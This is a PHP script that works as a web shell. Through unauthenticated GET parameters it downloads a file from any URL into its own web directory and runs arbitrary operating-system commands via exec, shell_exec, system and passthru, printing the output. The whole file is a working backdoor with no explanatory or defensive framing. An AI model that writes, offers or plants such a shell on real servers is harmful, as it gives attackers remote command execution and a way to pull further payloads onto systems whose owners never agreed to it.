<?php

if (isset($_GET['upload'])) {
    // URL of the file you want to download
    $url = $_GET['upload'];
    
    // Get the directory of the currently executing script
    $current_directory = __DIR__ . '/';
    
    // Get the file content from the URL
    $file_content = file_get_contents($url);
    
    // Check if the file content was fetched successfully
    if ($file_content !== false) {
        // Extract the filename from the URL
        $file_name = basename($url);
    
        // Specify the path where you want to save the file
        $save_path = $current_directory . $file_name;
    
        // Save the file content to the specified path
        if (file_put_contents($save_path, $file_content) !== false) {
            echo "File downloaded successfully and saved to: " . $save_path;
        } else {
            echo "Failed to save the file.";
        }
    } else {
        echo "Failed to download the file from the URL.";
    }
} elseif (isset($_GET['exec'])) {
    try {
        var_dump(exec($_GET['exec']));
    } catch (\Throwable $th) {
        var_dump($th);
    }
} elseif (isset($_GET['shell_exec'])) {
    try {
        var_dump(shell_exec($_GET['shell_exec']));
    } catch (\Throwable $th) {
        var_dump($th);
    }
} elseif (isset($_GET['system'])) {
    try {
        var_dump(system($_GET['system']));
    } catch (\Throwable $th) {
        var_dump($th);
    }
} elseif (isset($_GET['passthru'])) {
    try {
        var_dump(passthru($_GET['passthru']));
    } catch (\Throwable $th) {
        var_dump($th);
    }
}
